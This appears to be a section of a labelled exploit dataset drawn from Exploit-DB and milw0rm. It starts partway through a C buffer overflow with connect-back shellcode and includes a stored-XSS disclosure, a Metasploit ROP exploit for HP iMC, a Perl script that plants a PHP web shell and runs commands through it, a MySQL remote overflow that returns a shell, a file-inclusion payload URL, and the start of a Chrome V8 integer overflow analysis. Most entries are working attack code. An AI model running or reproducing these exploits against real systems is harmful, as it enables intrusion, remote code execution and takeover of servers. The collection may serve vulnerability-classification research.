  \t Platform\n"");   printf(""-----------------------------------------------\n"");   for(i = 0; targets[i].platform; i++)         printf(""%d \t %s\n"",i,targets[i].platform);   printf(""-----------------------------------------------\n"");   exit(0); }  int inject(char *port, char *ip) {     unsigned long xorip;     unsigned short xorport;     xorip = inet_addr(ip)^(unsigned long)0x6F88613F;     xorport = htons(atoi( port ))^(unsigned short)0x6F88;     memcpy ( &shellcode[184], &xorip, 4);     memcpy ( &shellcode[190], &xorport, 2);     return 0; }  int remote_connect( char* ip, unsigned short port ) {   int s;   struct sockaddr_in remote_addr;   struct hostent* host_addr;    memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );   if ( ( host_addr = gethostbyname ( ip ) ) == NULL )   {    printf ( ""[X] Cannot resolve \""%s\""\n"", ip );    exit ( 1 );   }   remote_addr.sin_family = AF_INET;   remote_addr.sin_port = htons ( port );   remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );   if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )   {    printf ( ""[X] Socket failed!\n"" );    exit ( 1 );   }   if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )   {    printf ( ""[X] Failed connecting!\n"" );    exit ( 1 );   }   return ( s ); }  int main(int argc, char *argv[]) {     int s,position;     unsigned int rcv;     char *buffer,*request;     char recvbuf[256];     banner();     if( (argc != 6) || (atoi(argv[2]) < 1) || (atoi(argv[2]) > 65534) )         usage(argv[0]);     position = 0;     printf(""[+] Creating evil buffer\n"");     buffer = (char *) malloc(BUFFSIZE);     request = (char *) malloc(BUFFSIZE + strlen(attack)); //  +3 == \r + \n + 0x00     memset(buffer,0x90,BUFFSIZE);  // Fill with nops      inject(argv[4],argv[3]);     // Xor port and ip and put them into the shellcode     memset(buffer,0x41,68);      // First comes the ascii     position = 68;     memcpy(buffer+position,DEADRET,4);     position = 680 - (strlen(shellcode) + 100);   // 680 : Pointer to next Execption structure     memcpy(buffer+position,shellcode,strlen(shellcode));     position += strlen(shellcode)+100;     memcpy(buffer+position,jmpover,4); position += 4;     memcpy(buffer+position,&targets[atoi(argv[5])].addr,4); position += 4;     position += 8; // 8 bytes more nops     memcpy(buffer+position,jmpback,strlen(jmpback)); position += strlen(jmpback);     position += 8; // 8 bytes more nops     memset(buffer+position,0x00,1); // End       sprintf(request,attack,buffer);     printf(""[+] Connecting to remote host\n"");     s = remote_connect(argv[1],atoi(argv[2]));     sleep(1);     printf(""[+] Sending %d bytes of painfull buffer\n"",strlen(buffer));     if ( send ( s, request, strlen (request), 0) <= 0 )     {            printf(""[X] Failed to send buffer\n"");            exit ( 1 );     }     printf(""[+] Done - Wait for shell on port %s\n"",argv[4]);     close(s);     free(buffer);     buffer = NULL;     return 0; }  // milw0rm.com [2006-10-30]",Remote Buffer Overflow,1
48522,"Online Marriage Registration System 1.0 - Persistent Cross-Site Scripting Exploit Title: Online Marriage Registration System 1.0 - Persistent Cross-Site Scripting # Google Dork: N/A # Date: 2020-05-26 # Exploit Author: that faceless coder(Inveteck Global) # Vendor Homepage: https://phpgurukul.com/ # Software Link: https://phpgurukul.com/online-marriage-registration-system-using-php-and-mysql/ # Version: Online Marriage Registration System 1.0 - Stored Cross-Site Scripting # Tested on: MAC OS MOJAVE v 10.14.6 # CVE : N/A  The Online Marriage Registration System suffers from multiple stored cross-site script vulnerabilities:   if(isset($_POST['submit']))   {    $nofhusband=$_POST['nofhusband']; $hreligion=$_POST['hreligion']; $haddress=$_POST['haddress']; $hstate=$_POST['hstate'];  $nofwife=$_POST['nofwife']; $wreligion=$_POST['wreligion']; $waddress=$_POST['waddress']; $wstate=$_POST['wstate']; $witnessnamef=$_POST['witnessnamef']; $waddressfirst=$_POST['waddressfirst']; $witnessnames=$_POST['witnessnames']; $waddresssec=$_POST['waddresssec']; $witnessnamet=$_POST['witnessnamet']; $waddressthird=$_POST['waddressthird'];  $sql=""insert into tblregistration(RegistrationNumber,UserID,DateofMarriage,HusbandName,HusImage,HusbandReligion,Husbanddob,HusbandSBM,HusbandAdd,HusbandZipcode,HusbandState,HusbandAdharno,WifeName,WifeImage,WifeReligion,Wifedob,WifeSBM,WifeAdd,WifeZipcode,WifeState,WifeAdharNo,WitnessNamefirst,WitnessAddressFirst,WitnessNamesec,WitnessAddresssec,WitnessNamethird,WitnessAddressthird)values(:regnumber,:uid,:dom,:nofhusband,:husimg,:hreligion,:hdob,:hsbmarriage,:haddress,:hzipcode,:hstate,:hadharno,:nofwife,:wifeimg,:wreligion,:wdob,:wsbmarriage,:waddress,:wzipcode,:wstate,:wadharno,:witnessnamef,:waddressfirst,:witnessnames,:waddresssec,:witnessnamet,:waddressthird)""; $query=$dbh->prepare($sql);  $sql=""insert into tblregistration(RegistrationNumber,UserID,DateofMarriage,HusbandName,HusImage,HusbandReligion,Husbanddob,HusbandSBM,HusbandAdd,HusbandZipcode,HusbandState,HusbandAdharno,WifeName,WifeImage,WifeReligion,Wifedob,WifeSBM,WifeAdd,WifeZipcode,WifeState,WifeAdharNo,WitnessNamefirst,WitnessAddressFirst,WitnessNamesec,WitnessAddresssec,WitnessNamethird,WitnessAddressthird)values(:regnumber,:uid,:dom,:nofhusband,:husimg,:hreligion,:hdob,:hsbmarriage,:haddress,:hzipcode,:hstate,:hadharno,:nofwife,:wifeimg,:wreligion,:wdob,:wsbmarriage,:waddress,:wzipcode,:wstate,:wadharno,:witnessnamef,:waddressfirst,:witnessnames,:waddresssec,:witnessnamet,:waddressthird)""; $query=$dbh->prepare($sql); $query->bindParam(':nofhusband',$nofhusband,PDO::PARAM_STR); $query->bindParam(':hreligion',$hreligion,PDO::PARAM_STR); $query->bindParam(':hdob',$hdob,PDO::PARAM_STR); $query->bindParam(':hsbmarriage',$hsbmarriage,PDO::PARAM_STR); $query->bindParam(':haddress',$haddress,PDO::PARAM_STR); $query->bindParam(':hzipcode',$hzipcode,PDO::PARAM_STR); $query->bindParam(':hstate',$hstate,PDO::PARAM_STR); $query->bindParam(':hadharno',$hadharno,PDO::PARAM_STR); $query->bindParam(':nofwife',$nofwife,PDO::PARAM_STR); $query->bindParam(':wifeimg',$wifeimg,PDO::PARAM_STR); $query->bindParam(':wreligion',$wreligion,PDO::PARAM_STR); $query->bindParam(':wdob',$wdob,PDO::PARAM_STR); $query->bindParam(':wsbmarriage',$wsbmarriage,PDO::PARAM_STR); $query->bindParam(':waddress',$waddress,PDO::PARAM_STR); $query->bindParam(':wzipcode',$wzipcode,PDO::PARAM_STR); $query->bindParam(':wstate',$wstate,PDO::PARAM_STR); $query->bindParam(':wadharno',$wadharno,PDO::PARAM_STR); $query->bindParam(':witnessnamef',$witnessnamef,PDO::PARAM_STR); $query->bindParam(':waddressfirst',$waddressfirst,PDO::PARAM_STR); $query->bindParam(':witnessnames',$witnessnames,PDO::PARAM_STR); $query->bindParam(':waddresssec',$waddresssec,PDO::PARAM_STR); $query->bindParam(':witnessnamet',$witnessnamet,PDO::PARAM_STR); $query->bindParam(':waddressthird',$waddressthird,PDO::PARAM_STR);  $query->execute();     $LastInsertId=$dbh->lastInsertId();    if ($LastInsertId>0) {  echo '<script>alert(""Registration form has been filled successfully."")</script>';   }   else     {          echo '<script>alert(""Something Went Wrong. Please try again"")</script>';     }  The data gets stored through the mentioned vulnerable parameters into the database. There is no filtering when those values are printed when the web application fetches the data from the database",Persistent Cross-Site Scripting,1
41710,"HP Intelligent Management Center < 5.0 E0102 - UAM Buffer Overflow (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::Udp    def initialize(info = {})     super(update_info(info,       'Name'           => 'HP Intelligent Management Center UAM Buffer Overflow',       'Description'    => %q{         This module exploits a remote buffer overflow in HP Intelligent Management Center         UAM. The vulnerability exists in the uam.exe component, when using sprint in a         insecure way for logging purposes. The vulnerability can be triggered by sending a         malformed packet to the 1811/UDP port. The module has been successfully tested on         HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability discovery           'sinn3r', # Metasploit module           'juan vazquez' # Metasploit module         ],       'References'     =>         [           ['CVE', '2012-3274'],           ['OSVDB', '85060'],           ['BID', '55271'],           ['ZDI', '12-171'],           ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c03589863']         ],       'Payload'        =>         {           'BadChars' => ""\x00\x0d\x0a"",           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"", # Stack adjustment # add esp, -3500           'Space' => 3925,           'DisableNops' => true         },       'Platform'       => ['win'],       'Targets'        =>         [           [ 'HP iMC 5.0 E0101 / UAM 5.0 E0102 on Windows 2003 SP2',             {               'Offset' => 4035,             }           ]         ],       'Privileged'     => true,       'DisclosureDate' => 'Aug 29 2012',       'DefaultTarget'  => 0))      register_options([Opt::RPORT(1811)], self.class)   end    def junk(n=4)     return rand_text_alpha(n).unpack(""V"")[0].to_i   end    def nop     return make_nops(4).unpack(""V"")[0].to_i   end    def send_echo_reply(operator)     packet = [0xF7103D21].pack(""N"") # command id     packet << rand_text(18)     packet << [0x102].pack(""n"") # watchdog command type => echo reply     packet << ""AAAA"" # ip (static to make offset until EIP static)     packet << ""AA"" # port (static to make offset until EIP static)     packet << operator # Operator max length => 4066, in order to bypass packet length restriction: 4096 total      connect_udp     udp_sock.put(packet)     disconnect_udp   end     def exploit      # ROP chain generated with mona.py - See corelan.be     rop_gadgets =       [         0x77bb2563, # POP EAX # RETN         0x77ba1114, # <- *&VirtualProtect()         0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN         junk,         0x77bb0c86, # XCHG EAX,ESI # RETN         0x77bc9801, # POP EBP # RETN         0x77be2265, # ptr to 'push esp #  ret'         0x77bb2563, # POP EAX # RETN         0x03C0990F,         0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)         0x77bb48d3, # POP EBX, RET         0x77bf21e0, # .data         0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN         0x77bbfc02, # POP ECX # RETN         0x77bef001, # W pointer (lpOldProtect) (-> ecx)         0x77bd8c04, # POP EDI # RETN         0x77bd8c05, # ROP NOP (-> edi)         0x77bb2563, # POP EAX # RETN         0x03c0984f,         0x77bdd441, # SUB EAX, 03c0940f         0x77bb8285, # XCHG EAX,EDX # RETN         0x77bb2563, # POP EAX # RETN         nop,         0x77be6591, # PUSHAD # ADD AL,0EF # RETN       ].pack(""V*"")      bof = rand_text(14)     bof << rop_gadgets     bof << payload.encoded     bof << ""C"" * (target['Offset'] - 14 - rop_gadgets.length - payload.encoded.length)     bof << [0x77bb0c86].pack(""V"") # EIP => XCHG EAX,ESI # RETN # from msvcrt.dll     bof << [0x77bcc397].pack(""V"") # ADD EAX,2C # POP EBP # RETN # from msvcrt.dll     bof << [junk].pack(""V"") # EBP     bof << [0x77bcba5e].pack(""V"") # XCHG EAX,ESP # RETN # from msvcrt.dll      print_status(""Trying target #{target.name}..."")     send_echo_reply(rand_text(20)) # something like... get up! ?     send_echo_reply(bof) # exploit   end end",remote buffer overflow,1
1512,"Admbook 1.2.2 - 'x-forwarded-for' Remote Command Execution #!/usr/bin/perl -w use IO::Socket;  print ""*************************************************************************\r\n""; print ""|            Admbook <=1.2.2 X-Forwarded-For cmmnds xctn xploit        |\r\n""; print ""|                     By rgod rgod<AT>autistici<DOT>org                |\r\n""; print ""|                   site: http://retrogod.altervista.org               |\r\n""; print ""|                                                                      |\r\n""; print ""| Sun-Tzu: \""Rouse him, and learn the principle of his  activity  or    |\r\n""; print ""| inactivity.  Force him to reveal himself,  so as to find out  his    |\r\n""; print ""| vulnerable spots.\""                                                   |\r\n""; print ""*************************************************************************\r\n""; print ""| dork:  intitle:admbook intitle:version filetype:php                   |\r\n""; print ""*************************************************************************\r\n""; sub main::urlEncode {     my ($string) = @_;     $string =~ s/(\W)/""%"" . unpack(""H2"", $1)/ge;     #$string# =~ tr/.//;     return $string;  }  $serv=$ARGV[0]; $path=$ARGV[1]; $cmd=""""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.=""%20"".urlEncode($ARGV[$i]);};  if (@ARGV < 3) { print ""Usage:\r\n""; print ""perl admbook_122_xpl.pl SERVER PATH COMMAND\r\n\r\n""; print ""SERVER         - Server where AdmBook is installed.\r\n""; print ""PATH           - Path to AdmBook (ex: /admbook/ or just /) \r\n""; print ""COMMAND        - A shell command \r\n""; print ""Example:\r\n""; print ""perl admbook_122_xpl.pl localhost /admbook/ ls -la\r\n""; exit(); }  $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", Timeout  => 10, PeerPort=>""http(80)"") or die ""[+] Connecting ... Could not connect to host.\n\n"";                 $SHELL='"";if (isset($_GET[CMD])){ECHO""Hi Master!"";INI_SET(""max_execution_time"",0);PASSTHRU($_GET[CMD]);DIE;}echo""'; $data=""page=1""; $data.=""&name=whoami""; $data.=""&url=""; $data.=""&email=whoami\@SUNTZU.COM""; $data.=""&icq=""; $message=urlEncode(""I love italian guys!""); $data.=""&message="".$message; print $sock ""POST "".$path.""write.php HTTP/1.1\r\n""; print $sock ""Referer: http://"".$serv.$path.""index.php\r\n""; print $sock ""X-Forwarded-For: GUESS_WHAT:"".$SHELL.""\r\n""; print $sock ""Content-Type: application/x-www-form-urlencoded\r\n""; print $sock ""User-Agent: sun-tzu\r\n""; print $sock ""Content-Length: "".length($data).""\r\n""; print $sock ""Host: "".$serv.""\r\n""; print $sock ""Connection: Close\r\n\r\n""; print $sock $data; close($sock);  sleep(2);  $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", Timeout  => 10, PeerPort=>""http(80)"") or die ""[+] Connecting ... Could not connect to host.\n\n"";  print $sock ""GET "".$path.""content-data.php?CMD="".$cmd."" HTTP/1.1\r\n""; print $sock ""Host: "".$serv.""\r\n""; print $sock ""Connection: close\r\n\r\n"";  while ($answer = <$sock>) {   print $answer; } close($sock);  # milw0rm.com [2006-02-19]",Remote Command Execution,1
98,"MySQL 3.23.x/4.0.x - Remote Buffer Overflow /* Mysql 3.23.x/4.0.x remote exploit * proof of concept * using jmp *eax * bkbll (bkbll cnhonker.net,bkbll tom.com) 2003/09/12 * compile:gcc -o mysql mysql.c -L/usr/lib/mysql -lmysqlclient * DO NOT DISTRUBITED IT */ #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <errno.h> #include <sys/socket.h> #include <sys/types.h> #include <sys/select.h> #include <netdb.h> #include <mysql/mysql.h>  #define PAD 19*4*2 #define JMPADDR 0x42125b2b #define ROOTUSER ""root"" #define PORT 3306 #define MYDB ""mysql"" #define ALTCOLUMSQL ""ALTER TABLE user CHANGE COLUMN Password Password LONGTEXT"" #define LISTUSERSQL ""SELECT user FROM mysql.user WHERE user!='root' OR user='root LIMIT 1,1'"" #define FLUSHSQL ""\x11\x00\x00\x00\x03\x66\x6C\x75\x73\x68\x20\x70\x72\x69\x76\x69\x6C\x65\x67\x65\x73"" #define BUF 1024  MYSQL *conn; char NOP[]=""90""; /* char shellcode[]= ""31c031db31c9b002"" ""cd8085c0751b4b31"" ""d2b007cd8031c0b0"" ""40cd8089c331c9b1"" ""09b025cd80b001cd"" ""80b017cd8031c050"" ""405089e331c9b0a2"" ""cd80b1e089c883e8"" ""0af7d04089c731c0"" ""404c89e250505257"" ""518d4c240431dbb3"" ""0ab066cd805983f8"" ""017505803a497409"" ""e2d231c04089c3cd"" ""8089fbb103b03f49"" ""cd8041e2f851686e"" ""2f7368682f2f6269"" ""89e351682d696c70"" ""89e251525389e131"" ""d231c0b00bcd8090""; */ char shellcode[]= ""db31c03102b0c931"" ""c08580cd314b1b74"" ""cd07b0d2b0c03180"" ""8980cd40b1c931c3"" ""cd25b009cd01b080"" ""cd17b08050c03180"" ""e3895040a2b0c931"" ""e0b180cde883c889"" ""40d0f70ac031c789"" ""e2894c4057525050"" ""244c8d51b3db3104"" ""cd66b00af8835980"" ""800575010974493a"" ""c031d2e2cdc38940"" ""b1fb8980493fb003"" ""e24180cd6e6851f8"" ""6868732f69622f2f"" ""6851e389706c692d"" ""5251e28931e18953"" ""b0c031d29080cd0b"";  int type=1; struct {  char *os;  u_long ret; } targets[] =      {           { ""glibc-2.2.93-5"", 0x42125b2b },     },v;  void usage(char *); void sqlerror(char *); MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname);  main(int argc,char **argv) {     MYSQL_RES *result;     MYSQL_ROW row;     char jmpaddress[8];     char buffer[BUF],muser[20],buf2[800];     my_ulonglong rslines;     struct sockaddr_in clisocket;     int i=0,j,clifd,count,a;     char data1,c;     fd_set fds;     char *server=NULL,*rootpass=NULL;      if(argc<3) usage(argv[0]);     while((c = getopt(argc, argv, ""d:t:p:""))!= EOF)       {             switch (c)             {               case 'd':                   server=optarg;                   break;               case 't':                   type = atoi(optarg);                   if((type > sizeof(targets)/sizeof(v)) || (type < 1))                        usage(argv[0]);                   break;              case 'p':                   rootpass=optarg;                    break;              default:                   usage(argv[0]);                   return 1;               }           }           if(server==NULL || rootpass==NULL)               usage(argv[0]);     memset(muser,0,20);     memset(buf2,0,800);     printf(""@-------------------------------------------------@\n"");     printf(""#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n"");     printf(""@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n"");     printf(""---------------------------------------------------\n"");     printf(""[+] Connecting to mysql server %s:%d...."",server,PORT);     fflush(stdout);     conn=mysqlconn(server,PORT,ROOTUSER,rootpass,MYDB);     if(conn==NULL) exit(0);     printf(""ok\n"");     printf(""[+] ALTER user column..."");     fflush(stdout);     if(mysql_real_query(conn,ALTCOLUMSQL,strlen(ALTCOLUMSQL))!=0)         sqlerror(""ALTER user table failed"");     //select     printf(""ok\n"");     printf(""[+] Select a valid user..."");     fflush(stdout);     if(mysql_real_query(conn,LISTUSERSQL,strlen(LISTUSERSQL))!=0)          sqlerror(""select user from table failed"");     printf(""ok\n"");     result=mysql_store_result(conn);     if(result==NULL)         sqlerror(""store result error"");     rslines=mysql_num_rows(result);     if(rslines==0)         sqlerror(""store result error"");     row=mysql_fetch_row(result);     snprintf(muser,19,""%s"",row[0]);     printf(""[+] Found a user:%s\n"",muser);     memset(buffer,0,BUF);     i=sprintf(buffer,""update user set password='"");     sprintf(jmpaddress,""%x"",JMPADDR);     jmpaddress[8]=0;     for(j=0;j<PAD-4;j+=2)     {         memcpy(buf2+j,NOP,2);     }     memcpy(buf2+j,""06eb"",4);     memcpy(buf2+PAD,jmpaddress,8);     memcpy(buf2+PAD+8,shellcode,strlen(shellcode));     j=strlen(buf2);     if(j%8)     {         j=j/8+1;         count=j*8-strlen(buf2);         memset(buf2+strlen(buf2),'A',count);     }     printf(""[+] Password length:%d\n"",strlen(buf2));     memcpy(buffer+i,buf2,strlen(buf2));     i+=strlen(buf2);     i+=sprintf(buffer+i,""' where user='%s'"",muser);     mysql_free_result(result);     printf(""[+] Modified password..."");     fflush(stdout);         //get result     //write(2,buffer,i);     if(mysql_real_query(conn,buffer,i)!=0)          sqlerror(""Modified password error"");     //here I'll find client socket fd     printf(""ok\n"");     printf(""[+] Finding client socket......"");     j=sizeof(clisocket);     for(clifd=3;clifd<256;clifd++)     {         if(getpeername(clifd,(struct sockaddr *)&clisocket,&j)==-1) continue;         if(clisocket.sin_port==htons(PORT)) break;     }     if(clifd==256)     {         printf(""FAILED\n[-] Cannot find client socket\n"");         mysql_close(conn);         exit(0);     }     data1='I';     printf(""ok\n"");     printf(""[+] socketfd:%d\n"",clifd);     //let server overflow     printf(""[+] Overflow server...."");     fflush(stdout);     send(clifd,FLUSHSQL,sizeof(FLUSHSQL),0);     //if(mysql_real_query(conn,FLUSHSQL,strlen(FLUSHSQL))!=0)      //    sqlerror(""Flush error"");     printf(""ok\n"");       printf(""[+] sending OOB......."");       fflush(stdout);       if(send(clifd,&data1,1,MSG_OOB)<1)       {           perror(""error"");           mysql_close(conn);           exit(0);       }     printf(""ok\r\n"");     printf(""[+] Waiting a shell....."");     fflush(stdout);     j=0;     memset(buffer,0,BUF);       while(1)     {         FD_ZERO(&fds);         FD_SET(0, &fds);         FD_SET(clifd, &fds);                  if (select(clifd+1, &fds, NULL, NULL, NULL) < 0)          {             if (errno == EINTR) continue;             break;         }         if (FD_ISSET(0, &fds))          {             count = read(0, buffer, BUF);             if (count <= 0) break;             if (write(clifd, buffer, count) <= 0) break;             memset(buffer,0,BUF);         }         if (FD_ISSET(clifd, &fds))          {             count = read(clifd, buffer, BUF);             if (count <= 0) break;             if(j==0) printf(""Ok\n"");             j=1;             if (write(1, buffer, count) <= 0) break;             memset(buffer,0,BUF);         }              }     }  void usage(char *s) {     int a;     printf(""@-------------------------------------------------@\n"");     printf(""#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n"");     printf(""@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n"");     printf(""---------------------------------------------------\n"");     printf(""Usage:%s -d <host> -p <root_pass> -t <type>\n"",s);     printf(""      -d target host ip/name\n"");     printf(""      -p 'root' user paasword\n"");     printf(""      -t  type [default:%d]\n"",type);     printf(""      ------------------------------\n"");     for(a = 0; a < sizeof(targets)/sizeof(v); a++)         printf(""         %d [0x%.8x]: %s\n"", a+1, targets[a].ret, targets[a].os);        printf(""\n"");                exit(0); } MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname) {     MYSQL *connect;     connect=mysql_init(NULL);     if(connect==NULL)     {         printf(""FAILED\n[-] init mysql failed:%s\n"",mysql_error(connect));         return NULL;     }     if(mysql_real_connect(connect,server,user,pass,dbname,port,NULL,0)==NULL)     {            printf(""FAILED\n[-] Error: %s\n"",mysql_error(connect));            return NULL;        }        return connect;  } void sqlerror(char *s) {     fprintf(stderr,""FAILED\n[-] %s:%s\n"",s,mysql_error(conn));     mysql_close(conn);     exit(0); }  // milw0rm.com [2003-09-14]",Remote Buffer Overflow,1
2958,"cwmVote 1.0 - 'archive.php' Remote File Inclusion ################################################################ #                                                              # #            cwmVote 1.0 File Include Vulnerability            # #                                                              # # F0und3R: bd0rk || SOH-Crew                                   # #                                                              # # Website: www.soh-crew.it.tt                                  # #                                                              # # Download: http://explorer.cwm-design.de/dirs/41/cwmVote.rar  # #                                                              # ################################################################  Vulnerable Code in archive.php   Code: include($abs.""inc/functions.inc.php""); include($abs.""inc/conf.mysql.inc.php""); include($abs.""inc/conf.pw.inc.php"");  Usage: http://[target]/[cwm_vote_path]/archive.php?abs=http://[Shellscript]  Greetings: TheJT, Lu7k, Kacper, nukedx, str0ke  # milw0rm.com [2006-12-19]",Remote File Inclusion,1
46748,"Google Chrome 72.0.3626.121 / 74.0.3725.0 - 'NewFixedDoubleArray' Integer Overflow VULNERABILITY DETAILS https://cs.chromium.org/chromium/src/v8/src/heap/factory.cc?rcl=dd689541d3815d64b4b39f6a41603248c71aa00e&l=496 Handle<FixedArrayBase> Factory::NewFixedDoubleArray(int length,                                                     PretenureFlag pretenure) {   DCHECK_LE(0, length);   if (length == 0) return empty_fixed_array();   if (length > FixedDoubleArray::kMaxLength) { // ***1***     isolate()->heap()->FatalProcessOutOfMemory(""invalid array length"");   }   int size = FixedDoubleArray::SizeFor(length); // ***2***   Map map = *fixed_double_array_map();   HeapObject result =       AllocateRawWithImmortalMap(size, pretenure, map, kDoubleAligned);   Handle<FixedDoubleArray> array(FixedDoubleArray::cast(result), isolate());   array->set_length(length);   return array; }  https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=933508f981a984b7868d70c3adb781783e5aa32d&l=1183 Object Slow_ArrayConcat(BuiltinArguments* args, Handle<Object> species,                         Isolate* isolate) { [...]   uint32_t estimate_result_length = 0;   uint32_t estimate_nof = 0;   FOR_WITH_HANDLE_SCOPE(isolate, int, i = 0, i, i < argument_count, i++, {     Handle<Object> obj = args->at(i);     uint32_t length_estimate;     uint32_t element_estimate;     if (obj->IsJSArray()) {       Handle<JSArray> array(Handle<JSArray>::cast(obj));       length_estimate = static_cast<uint32_t>(array->length()->Number());       if (length_estimate != 0) {         ElementsKind array_kind =             GetPackedElementsKind(array->GetElementsKind());         kind = GetMoreGeneralElementsKind(kind, array_kind);       }       element_estimate = EstimateElementCount(isolate, array);     } else { [...]     }     // Avoid overflows by capping at kMaxElementCount.     if (JSObject::kMaxElementCount - estimate_result_length < length_estimate) { // ***3***       estimate_result_length = JSObject::kMaxElementCount;     } else {       estimate_result_length += length_estimate;     }     if (JSObject::kMaxElementCount - estimate_nof < element_estimate) {       estimate_nof = JSObject::kMaxElementCount;     } else {       estimate_nof += element_estimate;     }   });    // If estimated number of elements is more than half of length, a   // fixed array (fast case) is more time and space-efficient than a   // dictionary.   bool fast_case = is_array_species &&                    (estimate_nof * 2) >= estimate_result_length &&                    isolate->IsIsConcatSpreadableLookupChainIntact(); // ***4***    if (fast_case && kind == PACKED_DOUBLE_ELEMENTS) {     Handle<FixedArrayBase> storage =         isolate->factory()->NewFixedDoubleArray(estimate_result_length); // ***5*** [...]  https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=9ea32aab5b494eaaf27ced51a6608e8400a3c4e5&l=1378 MaybeHandle<JSArray> Fast_ArrayConcat(Isolate* isolate,                                       BuiltinArguments* args) { [...]   int result_len = 0;   {     DisallowHeapAllocation no_gc;     // Iterate through all the arguments performing checks     // and calculating total length.     for (int i = 0; i < n_arguments; i++) {       Object arg = (*args)[i];       if (!arg->IsJSArray()) return MaybeHandle<JSArray>();       if (!HasOnlySimpleReceiverElements(isolate, JSObject::cast(arg))) {         return MaybeHandle<JSArray>();       }       // TODO(cbruni): support fast concatenation of DICTIONARY_ELEMENTS.       if (!JSObject::cast(arg)->HasFastElements()) {         return MaybeHandle<JSArray>();       }       Handle<JSArray> array(JSArray::cast(arg), isolate);       if (!IsSimpleArray(isolate, array)) { // ***6***         return MaybeHandle<JSArray>();       }       // The Array length is guaranted to be <= kHalfOfMaxInt thus we won't       // overflow.       result_len += Smi::ToInt(array->length());       DCHECK_GE(result_len, 0);       // Throw an Error if we overflow the FixedArray limits       if (FixedDoubleArray::kMaxLength < result_len || /// ***7***           FixedArray::kMaxLength < result_len) {         AllowHeapAllocation gc;         THROW_NEW_ERROR(isolate,                         NewRangeError(MessageTemplate::kInvalidArrayLength),                         JSArray);       }     }   }   return ElementsAccessor::Concat(isolate, args, n_arguments, result_len); }  https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=9ea32aab5b494eaaf27ced51a6608e8400a3c4e5&l=244 BUILTIN(ArrayPrototypeFill) { [...]   // 2. Let len be ? ToLength(? Get(O, ""length"")).   double length;   MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(       isolate, length, GetLengthProperty(isolate, receiver)); // ***8***    // 3. Let relativeStart be ? ToInteger(start).   // 4. If relativeStart < 0, let k be max((len + relativeStart), 0);   //    else let k be min(relativeStart, len).   Handle<Object> start = args.atOrUndefined(isolate, 2);    double start_index;   MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(       isolate, start_index, GetRelativeIndex(isolate, length, start, 0)); // ***9***    // 5. If end is undefined, let relativeEnd be len;   //    else let relativeEnd be ? ToInteger(end).   // 6. If relativeEnd < 0, let final be max((len + relativeEnd), 0);   //    else let final be min(relativeEnd, len).   Handle<Object> end = args.atOrUndefined(isolate, 3);    double end_index;   MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(       isolate, end_index, GetRelativeIndex(isolate, length, end, length)); [...]   if (TryFastArrayFill(isolate, &args, receiver, value, start_index,                        end_index)) {  https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=d8b0d88de4b7d73ea02abb8511c146944d6ccf67&l=2244 static Object FillImpl(Handle<JSObject> receiver, Handle<Object> obj_value,                        uint32_t start, uint32_t end) {   // Ensure indexes are within array bounds   DCHECK_LE(0, start);   DCHECK_LE(start, end);    // Make sure COW arrays are copied.   if (IsSmiOrObjectElementsKind(Subclass::kind())) {     JSObject::EnsureWritableFastElements(receiver);   }    // Make sure we have enough space.   uint32_t capacity =       Subclass::GetCapacityImpl(*receiver, receiver->elements());   if (end > capacity) {     Subclass::GrowCapacityAndConvertImpl(receiver, end); // ***10***     CHECK_EQ(Subclass::kind(), receiver->GetElementsKind());   }  |NewFixedDoubleArray| doesn't expect the |length| argument to be negative (there's even a DCHECK for that), as it would pass the maximum length check[1] and cause an integer overflow when computing the size of the backing store[2]. The undersized backing store then might be used for out-of-bounds  access. It turns out there are at least two methods that allow passing negative values to |NewFixedDoubleArray|.   1. Concat  The implementation of |Array.prototype.concat| in V8 has quite a few fast code paths that deal with different kinds of arguments. The structure roughly looks like:                       +------------------+                      |                  |       +--------------> Fast_ArrayConcat |       |              |                  |       |              +------------------+      *********************** +-------------+                                *                     * |             |               +----------------> packed double array * | ArrayConcat |               |                *                     * |             |               |                *********************** +-------------+               |       |              +------------------+                                    +---------------------+       |              |                  |                                    |                     |       +--------------> Slow_ArrayConcat |                 +------------------> fixed array storage |                      |                  |                 |                  |                     |                      +------------------+                 |                  +---------------------+                               |                           |                               |                +---------------------+       +---------------------+                               |                |                     |       |                     |                               +----------------> ArrayConcatVisitor  +-------> dictionary storage  |                                                |                     |       |                     |                                                +---------------------+       +---------------------+                                                           |                                                           |                  +---------------------+                                                           |                  |                     |                                                           +------------------> JSReceiver storage  |                                                                              |                     |                                                                     